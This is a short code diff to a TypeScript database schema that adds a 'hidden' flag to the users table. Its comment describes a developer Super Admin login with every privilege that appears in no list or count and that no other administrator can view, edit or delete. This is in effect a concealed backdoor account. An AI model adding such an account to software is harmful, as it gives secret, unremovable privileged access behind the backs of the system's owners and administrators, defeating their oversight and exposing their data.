@@ -156,6 +156,14 @@ export const users = pgTable('users', {
 	 * src/lib/capabilities.ts.
 	 */
 	customRoleId: uuid('custom_role_id').references((): any => customRoles.id),
+	/**
+	 * A system login, not a person: the developer's Super Admin
+	 * (DEVELOPER_EMAIL, see db/ensure-developer.ts). It signs in and has every
+	 * privilege, but no list, count, chart or picker shows it, and nobody else —
+	 * other Super Admins included — can open, edit or delete it. Filter lists
+	 * with `notHidden` from $lib/server/hidden-users.
+	 */
+	hidden: boolean('hidden').default(false).notNull(),
 	createdAt: timestamp('created_at', { withTimezone: true }).defaultNow().notNull(),
 	updatedAt: timestamp('updated_at', { withTimezone: true }).defaultNow().notNull()
 }, (t) => [index('users_reports_to').on(t.reportsTo)]);
